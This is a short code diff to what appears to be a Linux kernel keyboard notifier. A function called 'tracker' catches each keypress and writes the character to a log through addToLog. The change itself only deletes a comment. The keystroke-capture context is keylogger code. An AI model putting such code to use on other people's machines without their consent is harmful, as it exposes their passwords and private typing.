@@ -33,12 +33,6 @@ int tracker(struct notifier_block *nblock, unsigned long code, void *_param) {
     if(code == KBD_KEYCODE && param->down) {
         switch(param->value) {
 
-            /*
-
-             THERE IS LEGITIMATELY NO OTHER WAY TO DO THIS.
-
-            */
-
             case 2: // 1
                 key = '1';
                 addToLog(key);
